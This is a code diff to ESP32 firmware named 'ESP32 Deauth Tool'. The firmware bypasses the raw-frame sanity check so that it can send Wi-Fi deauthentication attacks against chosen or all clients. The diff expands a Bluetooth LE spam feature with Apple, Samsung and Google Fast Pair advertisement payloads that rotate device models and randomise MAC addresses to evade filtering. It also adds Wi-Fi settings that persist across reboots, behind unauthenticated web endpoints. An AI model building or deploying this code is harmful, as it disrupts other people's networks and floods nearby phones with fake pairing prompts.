@@ -38,8 +38,8 @@ static const char *TAG = "deauth";
 int ieee80211_raw_frame_sanity_check(int arg) { return 0; }
 
 /* ===== Config ===== */
-#define WIFI_SSID          "WIFI-2"
-#define WIFI_PASS          "1234567898765"
+#define DEFAULT_WIFI_SSID  "WIFI-2"
+#define DEFAULT_WIFI_PASS  "1234567898765"
 #define AP_SSID            "ESP32-Deauth"
 #define AP_PASS            "12345678"
 #define WEB_PORT           80
@@ -49,6 +49,9 @@ int ieee80211_raw_frame_sanity_check(int arg) { return 0; }
 #define MAX_NETWORKS  30
 #define MAX_CLIENTS   30
 #define MAX_RETRY     10
+#define NVS_NAMESPACE "deauth"
+#define NVS_KEY_SSID  "ssid"
+#define NVS_KEY_PASS  "pass"
 
 /* ===== Structs ===== */
 typedef struct {
@@ -72,6 +75,12 @@ static network_info_t s_networks[MAX_NETWORKS];
 static client_info_t  s_clients[MAX_CLIENTS];
 static int s_network_count = 0;
 static int s_client_count  = 0;
+
+/* WiFi config (from NVS) */
+static char s_wifi_ssid[33] = DEFAULT_WIFI_SSID;
+static char s_wifi_pass[65] = DEFAULT_WIFI_PASS;
+static volatile bool s_wifi_connected = false;
+static volatile bool s_ap_mode = false;
 
 #define MAX_WHITELIST 10
 static uint8_t s_whitelist[MAX_WHITELIST][6];
@@ -111,6 +120,55 @@ typedef struct __attribute__((packed)) {
 /* ===== Prototypes ===== */
 static void wifi_init_sta(void);
 static void wifi_init_ap(void);
+
+/* ===== NVS WiFi Config ===== */
+static void nvs_load_wifi_config(void)
+{
+    nvs_handle_t h;
+    if (nvs_open(NVS_NAMESPACE, NVS_READONLY, &h) == ESP_OK) {
+        size_t len = sizeof(s_wifi_ssid);
+        if (nvs_get_str(h, NVS_KEY_SSID, s_wifi_ssid, &len) != ESP_OK) {
+            strncpy(s_wifi_ssid, DEFAULT_WIFI_SSID, sizeof(s_wifi_ssid));
+        }
+        len = sizeof(s_wifi_pass);
+        if (nvs_get_str(h, NVS_KEY_PASS, s_wifi_pass, &len) != ESP_OK) {
+            strncpy(s_wifi_pass, DEFAULT_WIFI_PASS, sizeof(s_wifi_pass));
+        }
+        nvs_close(h);
+        ESP_LOGI(TAG, "Loaded WiFi from NVS: SSID=%s", s_wifi_ssid);
+    } else {
+        strncpy(s_wifi_ssid, DEFAULT_WIFI_SSID, sizeof(s_wifi_ssid));
+        strncpy(s_wifi_pass, DEFAULT_WIFI_PASS, sizeof(s_wifi_pass));
+        ESP_LOGI(TAG, "NVS empty, using defaults");
+    }
+}
+
+static void nvs_save_wifi_config(const char *ssid, const char *pass)
+{
+    nvs_handle_t h;
+    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
+        nvs_set_str(h, NVS_KEY_SSID, ssid);
+        nvs_set_str(h, NVS_KEY_PASS, pass);
+        nvs_commit(h);
+        nvs_close(h);
+        strncpy(s_wifi_ssid, ssid, sizeof(s_wifi_ssid));
+        strncpy(s_wifi_pass, pass, sizeof(s_wifi_pass));
+        ESP_LOGI(TAG, "Saved WiFi to NVS: SSID=%s", ssid);
+    }
+}
+
+static void nvs_clear_wifi_config(void)
+{
+    nvs_handle_t h;
+    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
+        nvs_erase_all(h);
+        nvs_commit(h);
+        nvs_close(h);
+    }
+    strncpy(s_wifi_ssid, DEFAULT_WIFI_SSID, sizeof(s_wifi_ssid));
+    strncpy(s_wifi_pass, DEFAULT_WIFI_PASS, sizeof(s_wifi_pass));
+    ESP_LOGI(TAG, "Cleared WiFi config, using defaults");
+}
 
 
 /* ===== Vendor OUI lookup ===== */
@@ -915,23 +973,25 @@ static void wifi_init_sta(void)
 
     wifi_config_t wifi_config = {
         .sta = {
-            .ssid = WIFI_SSID,
-            .password = WIFI_PASS,
             .threshold.authmode = WIFI_AUTH_WPA2_PSK,
         },
     };
+    strncpy((char *)wifi_config.sta.ssid, s_wifi_ssid, sizeof(wifi_config.sta.ssid) - 1);
+    strncpy((char *)wifi_config.sta.password, s_wifi_pass, sizeof(wifi_config.sta.password) - 1);
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
     ESP_ERROR_CHECK(esp_wifi_start());
 
-    ESP_LOGI(TAG, "Connecting to %s...", WIFI_SSID);
+    ESP_LOGI(TAG, "Connecting to %s...", s_wifi_ssid);
 
     EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group,
             WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
             pdFALSE, pdFALSE, portMAX_DELAY);
 
     if (bits & WIFI_CONNECTED_BIT) {
-        ESP_LOGI(TAG, "Connected to %s", WIFI_SSID);
+        ESP_LOGI(TAG, "Connected to %s", s_wifi_ssid);
+        s_wifi_connected = true;
+        s_ap_mode = false;
         wifi_ap_record_t ap_info;
         if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
             memcpy(s_target_bssid, ap_info.bssid, 6);
@@ -943,6 +1003,7 @@ static void wifi_init_sta(void)
         }
     } else if (bits & WIFI_FAIL_BIT) {
         ESP_LOGE(TAG, "Failed to connect. Starting AP...");
+        s_ap_mode = true;
         esp_wifi_stop();
         wifi_init_ap();
     }
@@ -1186,7 +1247,7 @@ static bool s_ble_spam_running = false;
 static uint32_t s_ble_spam_count = 0;
 static TaskHandle_t s_ble_spam_task_handle = NULL;
 
-/* Apple AirPods spam payload — triggers proximity popup */
+/* Apple AirPods spam payload — from EvilAppleJuice (ECTO-1A) */
 static const uint8_t apple_airpods[] = {
     0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
     0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
@@ -1194,26 +1255,89 @@ static const uint8_t apple_airpods[] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-/* Apple AppleTV Setup — unused but kept for reference */
-__attribute__((unused))
-static const uint8_t apple_tv[] = {
+static const uint8_t apple_airpods_pro[] = {
+    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
+    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+static const uint8_t apple_airpods_max[] = {
+    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
+    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+static const uint8_t apple_airpods_gen2[] = {
+    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
+    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+static const uint8_t apple_airpods_pro_gen2[] = {
+    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14,
+    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+static const uint8_t apple_appletv_setup[] = {
     0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
     0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
     0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
 };
 
-/* Samsung Galaxy — triggers Galaxy Buds popup */
-static const uint8_t samsung_galaxy[] = {
-    0x17, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
-    0x01, 0x01, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+static const uint8_t apple_appletv_pair[] = {
+    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
+    0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c,
+    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
 };
 
-/* Google Fast Pair — triggers pairing popup */
+static const uint8_t apple_setup_new_phone[] = {
+    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
+    0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
+    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
+};
+
+/* Samsung Galaxy Watch spam — from Bruce firmware */
+static const uint8_t samsung_galaxy[] = {
+    0x0F, 0xFF, 0x75, 0x00,
+    0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
+    0xFF, 0x00, 0x00, 0x43, 0x01
+};
+
+/* Samsung watch model bytes for different watches */
+static const uint8_t samsung_models[] = {
+    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13,
+    0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D,
+    0x1E, 0x20
+};
+
+/* Google Fast Pair — from Bruce firmware */
 static const uint8_t google_fastpair[] = {
-    0x15, 0xff, 0x4c, 0x00, 0x01, 0x00, 0x01, 0x00,
-    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    0x03, 0x03, 0x2C, 0xFE,
+    0x06, 0x16, 0x2C, 0xFE,
+    0x00, 0x00, 0x00,  /* model ID placeholder */
+    0x02, 0x0A, 0x00
+};
+
+/* Google Fast Pair model IDs (from Bruce firmware) */
+static const uint32_t google_models[] = {
+    0x0001F0, 0x000047, 0x00000A, 0x00000B, 0x00000D,
+    0x000007, 0x090000, 0x000048, 0x001000, 0x00B727,
+    0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400,
+    0x1E89A7, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66,
+    0xF52494, 0x718FA4, 0x0002F0, 0x92BBBD, 0x000006,
+    0x060000, 0xD446A7, 0x038B91, 0x02F637, 0x02D886,
+    0xF00001, 0xF00201, 0xF00209, 0xF00205, 0xF00305,
+    0xF00E97, 0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963,
+    0x05AA91, 0x05C452, 0x05C95C, 0x0602F0, 0x0603F0,
+    0x1E8B18, 0x1E955B, 0x06AE20, 0x06C197, 0x06C95C,
+    0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C, 0x07F426,
+    0x054B2D, 0x0660D7, 0x0903F0
 };
 
 typedef enum {
@@ -1271,9 +1395,26 @@ static void ble_spam_task(void *arg)
 
         switch (s_ble_spam_type) {
             case BLE_SPAM_APPLE:
-                memcpy(payload, apple_airpods, sizeof(apple_airpods));
-                payload_len = sizeof(apple_airpods);
-                /* Randomize MAC to avoid filtering */
+                {
+                    /* Cycle through different Apple devices for maximum effect */
+                    static int apple_idx = 0;
+                    const uint8_t *apple_payloads[] = {
+                        apple_airpods, apple_airpods_pro, apple_airpods_max,
+                        apple_airpods_gen2, apple_airpods_pro_gen2,
+                        apple_appletv_setup, apple_appletv_pair,
+                        apple_setup_new_phone
+                    };
+                    const size_t apple_sizes[] = {
+                        sizeof(apple_airpods), sizeof(apple_airpods_pro), sizeof(apple_airpods_max),
+                        sizeof(apple_airpods_gen2), sizeof(apple_airpods_pro_gen2),
+                        sizeof(apple_appletv_setup), sizeof(apple_appletv_pair),
+                        sizeof(apple_setup_new_phone)
+                    };
+                    payload_len = apple_sizes[apple_idx];
+                    memcpy(payload, apple_payloads[apple_idx], payload_len);
+                    apple_idx = (apple_idx + 1) % 8;
+                }
+                /* Randomize MAC */
                 {
                     uint8_t rand_addr[6];
                     rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
@@ -1283,8 +1424,14 @@ static void ble_spam_task(void *arg)
                 break;
 
             case BLE_SPAM_SAMSUNG:
-                memcpy(payload, samsung_galaxy, sizeof(samsung_galaxy));
-                payload_len = sizeof(samsung_galaxy);
+                {
+                    /* Randomize Samsung watch model */
+                    static int samsung_idx = 0;
+                    memcpy(payload, samsung_galaxy, sizeof(samsung_galaxy));
+                    payload_len = sizeof(samsung_galaxy);
+                    payload[14] = samsung_models[samsung_idx];
+                    samsung_idx = (samsung_idx + 1) % 26;
+                }
                 {
                     uint8_t rand_addr[6];
                     rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
@@ -1294,8 +1441,18 @@ static void ble_spam_task(void *arg)
                 break;
 
             case BLE_SPAM_GOOGLE:
-                memcpy(payload, google_fastpair, sizeof(google_fastpair));
-                payload_len = sizeof(google_fastpair);
+                {
+                    /* Randomize Google Fast Pair model ID */
+                    static int google_idx = 0;
+                    memcpy(payload, google_fastpair, sizeof(google_fastpair));
+                    payload_len = sizeof(google_fastpair);
+                    uint32_t model = google_models[google_idx];
+                    payload[8] = (model >> 16) & 0xFF;
+                    payload[9] = (model >> 8) & 0xFF;
+                    payload[10] = model & 0xFF;
+                    payload[13] = (esp_random() % 120) - 100;
+                    google_idx = (google_idx + 1) % (sizeof(google_models) / sizeof(google_models[0]));
+                }
                 {
                     uint8_t rand_addr[6];
                     rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
@@ -1307,16 +1464,53 @@ static void ble_spam_task(void *arg)
             case BLE_SPAM_ALL:
                 {
                     static int spam_idx = 0;
-                    const uint8_t *payloads[] = {
-                        apple_airpods, samsung_galaxy, google_fastpair
-                    };
-                    const size_t sizes[] = {
-                        sizeof(apple_airpods), sizeof(samsung_galaxy), sizeof(google_fastpair)
-                    };
-                    memcpy(payload, payloads[spam_idx], sizes[spam_idx]);
-                    payload_len = sizes[spam_idx];
-                    spam_idx = (spam_idx + 1) % 3;
-
+                    switch (spam_idx % 3) {
+                        case 0: {
+                            /* Apple */
+                            static int ai = 0;
+                            const uint8_t *ap[] = {
+                                apple_airpods, apple_airpods_pro, apple_airpods_max,
+                                apple_airpods_gen2, apple_airpods_pro_gen2,
+                                apple_appletv_setup, apple_appletv_pair,
+                                apple_setup_new_phone
+                            };
+                            const size_t as[] = {
+                                sizeof(apple_airpods), sizeof(apple_airpods_pro), sizeof(apple_airpods_max),
+                                sizeof(apple_airpods_gen2), sizeof(apple_airpods_pro_gen2),
+                                sizeof(apple_appletv_setup), sizeof(apple_appletv_pair),
+                                sizeof(apple_setup_new_phone)
+                            };
+                            payload_len = as[ai];
+                            memcpy(payload, ap[ai], payload_len);
+                            ai = (ai + 1) % 8;
+                            break;
+                        }
+                        case 1: {
+                            /* Samsung */
+                            static int si = 0;
+                            memcpy(payload, samsung_galaxy, sizeof(samsung_galaxy));
+                            payload_len = sizeof(samsung_galaxy);
+                            payload[14] = samsung_models[si];
+                            si = (si + 1) % 26;
+                            break;
+                        }
+                        case 2: {
+                            /* Google */
+                            static int gi = 0;
+                            memcpy(payload, google_fastpair, sizeof(google_fastpair));
+                            payload_len = sizeof(google_fastpair);
+                            uint32_t m = google_models[gi];
+                            payload[8] = (m >> 16) & 0xFF;
+                            payload[9] = (m >> 8) & 0xFF;
+                            payload[10] = m & 0xFF;
+                            payload[13] = (esp_random() % 120) - 100;
+                            gi = (gi + 1) % (sizeof(google_models) / sizeof(google_models[0]));
+                            break;
+                        }
+                    }
+                    spam_idx++;
+                }
+                {
                     uint8_t rand_addr[6];
                     rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
                     for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
@@ -1441,13 +1635,20 @@ static const char index_html[] =
 "<button onclick='wladd()'>Add</button></div></div>"
 "<div class='card'><h2>BLE SPAM</h2>"
 "<div><select id='ble_type'>"
-"<option value='apple'>Apple AirPods/AppleTV</option>"
-"<option value='samsung'>Samsung Galaxy Buds</option>"
-"<option value='google'>Google Fast Pair</option>"
+"<option value='apple'>Apple (AirPods/AppleTV)</option>"
+"<option value='samsung'>Samsung (Galaxy Buds)</option>"
+"<option value='google'>Google (Fast Pair)</option>"
 "<option value='all'>All (rotate)</option></select></div>"
 "<div>Packets sent: <span id='ble_count'>0</span></div>"
 "<br><button class='d' onclick='ble_start()'>START BLE SPAM</button>"
 "<button onclick='ble_stop()'>STOP</button></div>"
+"<div class='card'><h2>WIFI CONFIG</h2>"
+"<div>Current SSID: <b id='cur_ssid'>-</b> | Connected: <b id='cur_conn'>-</b></div>"
+"<div><input type='text' id='wssid' placeholder='SSID' style='width:160px'>"
+"<input type='text' id='wpass' placeholder='Password' style='width:160px'>"
+"<button onclick='wifiset()'>Save</button></div>"
+"<div><button onclick='wifireset()'>Reset to defaults</button>"
+"<button onclick='if(confirm(\"Reboot?\"))fetch(\"/api/reboot\")'>Reboot</button></div></div>"
 "<div class='card'><h2>DEAUTH ATTACK</h2>"
 "<div><select id='tgt' onchange='document.getElementById(\"csl\").style.display=this.value==\"manual\"?\"inline-block\":\"none\";document.getElementById(\"manmac\").style.display=this.value==\"manual\"?\"inline-block\":\"none\"'>"
 "<option value='all'>All (broadcast)</option>"
@@ -1478,7 +1679,9 @@ static const char index_html[] =
 "st.innerHTML=c;"
 "st.className=_on?'st on pulse':'st';"
 "sh.innerHTML=_on?'<span style=color:#f44>&#9679;</span> ATTACK RUNNING':'STATUS';"
-"document.getElementById('ble_count').textContent=d.ble_spam_count||0;}"
+"document.getElementById('ble_count').textContent=d.ble_spam_count||0;"
+"document.getElementById('cur_ssid').textContent=d.ssid||'-';"
+"document.getElementById('cur_conn').textContent=d.wifi?'Yes':'No';}"
 "function refresh(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){upSt(d)}).catch(function(e){L('Error: '+e)})}"
 "function scan(){var b=document.getElementById('scanbtn');b.disabled=true;b.textContent='Scanning...';b.style.background='#f44';"
 "L('Scanning...');fetch('/api/scan').then(function(r){return r.json()}).then(function(d){"
@@ -1526,6 +1729,12 @@ static const char index_html[] =
 "}"
 "function ble_stop(){fetch('/api/ble/spam/stop').then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
 "}"
+"function wifiset(){var s=document.getElementById('wssid').value;var p=document.getElementById('wpass').value;"
+"if(!s){L('Enter SSID!');return}"
+"fetch('/api/wifi/set?ssid='+encodeURIComponent(s)+'&pass='+encodeURIComponent(p))"
+".then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})}"
+"function wifireset(){if(!confirm('Reset WiFi to defaults?'))return;"
+"fetch('/api/wifi/reset').then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})}"
 "refresh();setInterval(refresh,2000);wlrefresh();"
 "</script></body></html>";
 
@@ -1589,10 +1798,7 @@ static esp_err_t handle_scan(httpd_req_t *req)
         return ESP_OK;
     }
 
-    s_network_count = 0;
-    s_client_count  = 0;
-
-    /* ESP-IDF WiFi scan — find networks */
+    /* ESP-IDF WiFi scan — find networks (only add new) */
     wifi_scan_config_t scan_cfg = { .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = false };
     ESP_LOGI(TAG, "Starting WiFi scan...");
     esp_err_t err = esp_wifi_scan_start(&scan_cfg, true);
@@ -1617,12 +1823,23 @@ static esp_err_t handle_scan(httpd_req_t *req)
     if (ap_records) {
         esp_wifi_scan_get_ap_records(&ap_count, ap_records);
         for (int i = 0; i < ap_count; i++) {
-            memcpy(s_networks[s_network_count].bssid, ap_records[i].bssid, 6);
-            s_networks[s_network_count].rssi    = ap_records[i].rssi;
-            s_networks[s_network_count].channel = ap_records[i].primary;
-            strncpy(s_networks[s_network_count].ssid, (char *)ap_records[i].ssid, 32);
-            s_networks[s_network_count].ssid[32] = '\0';
-            s_network_count++;
+            /* Only add if not already known */
+            bool found = false;
+            for (int j = 0; j < s_network_count; j++) {
+                if (memcmp(s_networks[j].bssid, ap_records[i].bssid, 6) == 0) {
+                    s_networks[j].rssi = ap_records[i].rssi;
+                    found = true;
+                    break;
+                }
+            }
+            if (!found && s_network_count < MAX_NETWORKS) {
+                memcpy(s_networks[s_network_count].bssid, ap_records[i].bssid, 6);
+                s_networks[s_network_count].rssi    = ap_records[i].rssi;
+                s_networks[s_network_count].channel = ap_records[i].primary;
+                strncpy(s_networks[s_network_count].ssid, (char *)ap_records[i].ssid, 32);
+                s_networks[s_network_count].ssid[32] = '\0';
+                s_network_count++;
+            }
         }
         free(ap_records);
     }
@@ -1635,7 +1852,7 @@ static esp_err_t handle_scan(httpd_req_t *req)
 
     for (int ch = 1; ch <= 13; ch++) {
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-        vTaskDelay(pdMS_TO_TICKS(800));
+        vTaskDelay(pdMS_TO_TICKS(500));
     }
 
     esp_wifi_set_promiscuous(false);
@@ -1909,6 +2126,80 @@ static esp_err_t handle_ble_spam_stop(httpd_req_t *req)
 }
 
 /* =====================================================
+ *  WiFi Config API
+ * ===================================================== */
+
+static esp_err_t handle_wifi_config_get(httpd_req_t *req)
+{
+    cJSON *json = cJSON_CreateObject();
+    cJSON_AddStringToObject(json, "ssid", s_wifi_ssid);
+    cJSON_AddBoolToObject(json, "connected", s_wifi_connected);
+    cJSON_AddBoolToObject(json, "ap_mode", s_ap_mode);
+    char *str = cJSON_PrintUnformatted(json);
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, str, strlen(str));
+    cJSON_free(str);
+    cJSON_Delete(json);
+    return ESP_OK;
+}
+
+static esp_err_t handle_wifi_config_set(httpd_req_t *req)
+{
+    char query[128] = {0};
+    httpd_req_get_url_query_str(req, query, sizeof(query));
+    char ssid[33] = {0};
+    char pass[65] = {0};
+    httpd_query_key_value(query, "ssid", ssid, sizeof(ssid));
+    httpd_query_key_value(query, "pass", pass, sizeof(pass));
+
+    if (strlen(ssid) == 0) {
+        httpd_resp_send_500(req);
+        return ESP_FAIL;
+    }
+
+    nvs_save_wifi_config(ssid, pass);
+
+    cJSON *json = cJSON_CreateObject();
+    cJSON_AddStringToObject(json, "status", "Saved. Reboot to apply.");
+    cJSON_AddStringToObject(json, "ssid", ssid);
+    char *str = cJSON_PrintUnformatted(json);
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, str, strlen(str));
+    cJSON_free(str);
+    cJSON_Delete(json);
+    return ESP_OK;
+}
+
+static esp_err_t handle_wifi_config_reset(httpd_req_t *req)
+{
+    nvs_clear_wifi_config();
+
+    cJSON *json = cJSON_CreateObject();
+    cJSON_AddStringToObject(json, "status", "Reset to defaults. Reboot to apply.");
+    cJSON_AddStringToObject(json, "ssid", DEFAULT_WIFI_SSID);
+    char *str = cJSON_PrintUnformatted(json);
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, str, strlen(str));
+    cJSON_free(str);
+    cJSON_Delete(json);
+    return ESP_OK;
+}
+
+static esp_err_t handle_reboot(httpd_req_t *req)
+{
+    cJSON *json = cJSON_CreateObject();
+    cJSON_AddStringToObject(json, "status", "Rebooting...");
+    char *str = cJSON_PrintUnformatted(json);
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, str, strlen(str));
+    cJSON_free(str);
+    cJSON_Delete(json);
+    vTaskDelay(pdMS_TO_TICKS(500));
+    esp_restart();
+    return ESP_OK;
+}
+
+/* =====================================================
  *  Web Server Start
  * ===================================================== */
 
@@ -1916,7 +2207,7 @@ static void start_web_server(void)
 {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.server_port = WEB_PORT;
-    config.max_uri_handlers = 12;
+    config.max_uri_handlers = 16;
 
     if (httpd_start(&s_server, &config) == ESP_OK) {
         httpd_uri_t uri_index = {
@@ -1973,6 +2264,27 @@ static void start_web_server(void)
         httpd_register_uri_handler(s_server, &uri_ble_spam_start);
         httpd_register_uri_handler(s_server, &uri_ble_spam_stop);
 
+        httpd_uri_t uri_wifi_config_get = {
+            .uri = "/api/wifi/config", .method = HTTP_GET,
+            .handler = handle_wifi_config_get, .user_ctx = NULL
+        };
+        httpd_uri_t uri_wifi_config_set = {
+            .uri = "/api/wifi/set", .method = HTTP_GET,
+            .handler = handle_wifi_config_set, .user_ctx = NULL
+        };
+        httpd_uri_t uri_wifi_config_reset = {
+            .uri = "/api/wifi/reset", .method = HTTP_GET,
+            .handler = handle_wifi_config_reset, .user_ctx = NULL
+        };
+        httpd_uri_t uri_reboot = {
+            .uri = "/api/reboot", .method = HTTP_GET,
+            .handler = handle_reboot, .user_ctx = NULL
+        };
+        httpd_register_uri_handler(s_server, &uri_wifi_config_get);
+        httpd_register_uri_handler(s_server, &uri_wifi_config_set);
+        httpd_register_uri_handler(s_server, &uri_wifi_config_reset);
+        httpd_register_uri_handler(s_server, &uri_reboot);
+
         ESP_LOGI(TAG, "Web server on port %d", WEB_PORT);
     }
 }
@@ -1984,7 +2296,7 @@ static void start_web_server(void)
 void app_main(void)
 {
     ESP_LOGI(TAG, "=== ESP32 Deauth Tool ===");
-    ESP_LOGI(TAG, "WiFi: %s", WIFI_SSID);
+    ESP_LOGI(TAG, "WiFi: %s", s_wifi_ssid);
 
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
@@ -1994,6 +2306,7 @@ void app_main(void)
 
     s_scan_mutex = xSemaphoreCreateMutex();
 
+    nvs_load_wifi_config();
     init_ble();
     wifi_init_sta();
     start_web_server();
